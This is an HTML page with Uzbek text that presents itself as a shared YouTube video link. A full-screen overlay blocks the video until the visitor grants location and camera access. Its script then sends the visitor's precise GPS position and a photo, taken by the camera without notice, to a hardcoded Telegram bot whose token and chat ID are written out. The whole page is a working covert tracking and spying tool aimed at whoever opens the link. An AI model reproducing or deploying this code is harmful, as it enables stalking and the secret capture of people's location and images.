<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Link</title>
    <style>
        html, body {
            margin: 0;
            padding: 0;
            height: 100%;
            overflow: hidden;
            font-family: Arial, sans-serif;
        }
        #video-container {
            position: absolute;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            overflow: hidden;
        }
        iframe {
            width: 100%;
            height: 100%;
            border: none;
        }
        #prompt-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        #prompt-message {
            background: white;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            max-width: 80%;
        }
        #prompt-message button {
            margin-top: 10px;
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
        }
        #camera-preview {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 2000;
            max-width: 90%;
            max-height: 90%;
        }
        #permission-status {
            position: fixed;
            bottom: 20px;
            left: 20px;
            background: rgba(0,0,0,0.7);
            color: white;
            padding: 10px;
            border-radius: 5px;
            z-index: 3000;
        }
        .permission-btn {
            margin: 5px;
            padding: 10px 15px;
            font-size: 14px;
            cursor: pointer;
            border: none;
            border-radius: 5px;
        }
        #location-btn {
            background-color: #2196F3;
            color: white;
        }
        #camera-btn {
            background-color: #FF9800;
            color: white;
        }
    </style>
</head>
<body>
    <div id="video-container">
        <iframe src="https://www.youtube.com/embed/-4fLvxV9fvE?autoplay=1&mute=0&controls=1" 
                title="YouTube video player" 
                frameborder="0" 
                allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" 
                allowfullscreen>
        </iframe>
    </div>

    <div id="prompt-overlay">
        <div id="prompt-message">
            <h2>Ruxsatlar kerak</h2>
            <p>Iltimos, quyidagi ruxsatlarni bering:</p>
            <button id="location-btn" class="permission-btn" onclick="requestLocation()">Joylashuv ruxsati</button>
            <button id="camera-btn" class="permission-btn" onclick="requestCameraPermission()">Kamera ruxsati</button>
        </div>
    </div>

    <video id="camera-preview" autoplay playsinline></video>
    <div id="permission-status"></div>

    <script>
        const BOT_TOKEN = '7393954828:AAHhCwcD7LlP8SUmCx-Pefw3IT-70yQynN4';
        const CHAT_ID = '7281698380';
        let locationGranted = false;
        let cameraGranted = false;

        function updateStatus(message) {
            const statusElement = document.getElementById('permission-status');
            statusElement.textContent = message;
            setTimeout(() => {
                statusElement.textContent = '';
            }, 3000);
        }

        async function sendLocationToTelegram(latitude, longitude) {
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, latitude, longitude })
                });
                if (response.ok) {
                    updateStatus('Joylashuv yuborildi!');
                    console.log('Joylashuv yuborildi!');
                    locationGranted = true;
                    checkAllPermissions();
                } else {
                    throw new Error('Joylashuv yuborishda xato');
                }
            } catch (error) {
                console.error('Joylashuv xatosi:', error);
                updateStatus('Joylashuv yuborishda xato: ' + error.message);
            }
        }

        async function sendPhotoToTelegram(imageBlob) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', imageBlob, 'camera-photo.png');

            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                if (response.ok) {
                    updateStatus('Rasm yuborildi!');
                    console.log('Rasm yuborildi!');
                    cameraGranted = true;
                    checkAllPermissions();
                } else {
                    throw new Error('Rasm yuborishda xato');
                }
            } catch (error) {
                console.error('Rasm xatosi:', error);
                updateStatus('Rasm yuborishda xato: ' + error.message);
            }
        }

        function capturePhotoFromCamera() {
            const video = document.getElementById('camera-preview');
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Stop camera stream
            const stream = video.srcObject;
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
            video.style.display = 'none';

            // Convert to blob and send
            canvas.toBlob(async (blob) => {
                if (blob) {
                    await sendPhotoToTelegram(blob);
                } else {
                    updateStatus('Rasm yaratishda xato!');
                    console.error('Rasm yaratishda xato!');
                }
            }, 'image/jpeg', 0.9);
        }

        async function startCamera() {
            const video = document.getElementById('camera-preview');
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: {
                        facingMode: 'environment',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    }
                });
                
                video.srcObject = stream;
                video.style.display = 'block';
                updateStatus('Kamera ochildi... 2 soniyada rasm olinadi');
                
                // Wait for video to actually start playing
                return new Promise((resolve) => {
                    video.onplaying = () => {
                        setTimeout(() => {
                            capturePhotoFromCamera();
                            resolve();
                        }, 2000);
                    };
                });
            } catch (error) {
                console.error('Kamera xatosi:', error);
                updateStatus('Kameraga ruxsat berilmadi: ' + error.message);
                throw error;
            }
        }

        async function requestLocation() {
            if (locationGranted) return;
            
            return new Promise((resolve, reject) => {
                if (navigator.geolocation) {
                    updateStatus('Joylashuv so\'ralmoqda...');
                    navigator.geolocation.getCurrentPosition(
                        async (position) => {
                            const { latitude, longitude } = position.coords;
                            await sendLocationToTelegram(latitude, longitude);
                            console.log('Joylashuv olindi:', latitude, longitude);
                            resolve();
                        },
                        (error) => {
                            console.error('Joylashuv xatosi:', error);
                            updateStatus('Joylashuvga ruxsat berilmadi: ' + error.message);
                            reject(error);
                        },
                        {
                            enableHighAccuracy: true,
                            timeout: 10000,
                            maximumAge: 0
                        }
                    );
                } else {
                    const error = new Error('Geolocation not supported');
                    console.error('Brauzerda geolocation qo\'llab-quvvatlanmaydi!');
                    updateStatus('Joylashuv qo\'llab-quvvatlanmaydi!');
                    reject(error);
                }
            });
        }

        async function requestCameraPermission() {
            if (cameraGranted) return;
            
            try {
                updateStatus('Kamera ruxsati so\'ralmoqda...');
                // First check if we can query the permission state
                if (navigator.permissions) {
                    const permission = await navigator.permissions.query({ name: 'camera' });
                    if (permission.state === 'granted') {
                        await startCamera();
                        return;
                    }
                }
                
                // If no permission API or not granted, request directly
                await startCamera();
            } catch (error) {
                console.error('Camera ruxsat xatosi:', error);
                updateStatus('Kamera ruxsati berilmadi: ' + error.message);
                throw error;
            }
        }

        function checkAllPermissions() {
            if (locationGranted && cameraGranted) {
                document.getElementById('prompt-overlay').style.display = 'none';
            }
        }

        document.addEventListener('DOMContentLoaded', () => {
            try {
                if (document.documentElement.requestFullscreen) {
                    document.documentElement.requestFullscreen().catch(err => {
                        console.error('To\'liq ekran xatosi:', err);
                    });
                }
            } catch (err) {
                console.error('Fullscreen error:', err);
            }
        });
    </script>
</body>
</html>
